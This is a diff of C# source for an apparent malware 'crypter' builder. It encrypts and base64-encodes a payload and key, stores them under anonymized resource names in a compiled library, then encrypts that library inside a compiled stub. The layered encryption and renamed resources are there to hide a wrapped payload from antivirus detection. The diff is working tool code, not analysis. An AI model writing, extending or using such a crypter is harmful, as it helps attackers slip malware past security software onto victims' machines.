@@ -51,12 +51,42 @@ namespace managedcrypter
             foreach (string libFile in lDirectory.Source.Files.Values)
                 Console.WriteLine("Lib File: {0}", libFile);
 
+
+            /* initialize both workspace */
             sDirectory.CreateWorkspaceDirectory();
             lDirectory.CreateWorkspaceDirectory();
 
+            #region Library Workspace
+
+            /***************************/
+            /* begin library workspace */
+            /***************************/
+
             /* init lib workspace */
             var lWorkspace = lDirectory.Workspace;
+
             lWorkspace.AddChild("lib");
+            lWorkspace.AddChild("payload");
+            lWorkspace.AddChild("keyfile_payload");
+
+            lWorkspace.AnonymizeChildren();
+
+            /* write resources of lib */
+            lWorkspace.WriteAnonymous(lWorkspace.AnonymousChildren["keyfile_payload"], cFile.EncryptionKey);
+            lWorkspace.WriteAnonymous(lWorkspace.AnonymousChildren["payload"], cFile.EncodedData);
+
+            /* replace anonymous resource names in library*/
+            {
+                Utils.ReplaceStringInFile(
+                    lDirectory.Source.Files["ResourceGetter"],
+                    StringConstants.STR_PAYLOAD_KEY,
+                    lWorkspace.AnonymousChildren["keyfile_payload"]);
+
+                Utils.ReplaceStringInFile(
+                    lDirectory.Source.Files["ResourceGetter"],
+                    StringConstants.STR_PAYLOAD_NAME,
+                    lWorkspace.AnonymousChildren["payload"]);
+            }
 
             Console.ReadLine();
 
@@ -66,6 +96,8 @@ namespace managedcrypter
                 CompilerInfo cInfo = new CompilerInfo();
                 cInfo.GenerateLibrary = true;
                 cInfo.OutputDestination = lWorkspace.Children["lib"];
+                cInfo.EmbeddedResources.AddRange(Directory.GetFiles(lWorkspace.Parent));
+                cInfo.ExCompilerOptions.Add("/unsafe");
 
                 if (lCompiler.CompileSource(lDirectory, cInfo))
                 {
@@ -74,33 +106,35 @@ namespace managedcrypter
                 }
             }
 
-            /* xor -> b64 our lib */
-            lFile.EncryptData();
-            lFile.EncodeData();
+            /***************************/
+            /* end library workspace */
+            /***************************/
 
-            Console.WriteLine("Sanity Check Lib: {0}", lFile.SanityCheck());
+            #endregion
+
+            #region Stub Workspace
+
+            /***************************/
+            /*   begin stub workspace  */
+            /***************************/
 
             /* init stub workspace */
-            /* todo: use dictionary<string, string> to anonymize the resource names */
             var sWorkspace = sDirectory.Workspace;
-
-            sWorkspace.AddChild("keyfile_payload");
-            sWorkspace.AddChild("payload");
             sWorkspace.AddChild("keyfile_lib");
             sWorkspace.AddChild("lib");
 
             sWorkspace.AnonymizeChildren();
 
-            foreach (string workspaceFiles in sWorkspace.Children.Values)
-                Console.WriteLine("Workspace File Initialized: {0}", workspaceFiles);
+            /* encrypt our library */
+            lFile.EncryptData();
+            lFile.EncodeData();
 
-            /* write workspace files */
-            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["keyfile_payload"], cFile.EncryptionKey);
-            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["payload"], cFile.EncodedData);
+            Console.WriteLine("Sanity Check Lib: {0}", lFile.SanityCheck());
+
             sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["keyfile_lib"], lFile.EncryptionKey);
             sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["lib"], lFile.EncodedData);
 
-            /* replace anonymous resource names */
+            /* replace anonymous resource names in stub */
             {
                 Utils.ReplaceStringInFile(
                     sDirectory.Source.Files["GetKeyFile"],
@@ -108,14 +142,13 @@ namespace managedcrypter
                     sWorkspace.AnonymousChildren["keyfile_lib"]);
 
                 Utils.ReplaceStringInFile(
-
                     sDirectory.Source.Files["GetLib"],
                     StringConstants.STR_LIBRARY_NAME,
                     sWorkspace.AnonymousChildren["lib"]);
             }
 
             Console.ReadLine();
-
+         
             /* compile our stub */
             using (GenericCompiler sCompiler = new GenericCompiler())
             {
@@ -136,6 +169,12 @@ namespace managedcrypter
                 if (sCompiler.CompileSource(sDirectory, cInfo))
                     Console.WriteLine("Successfully compiled stub!");
             }
+
+            /***************************/
+            /*   end stub workspace    */
+            /***************************/
+
+            #endregion
 
             Console.ReadLine();
 
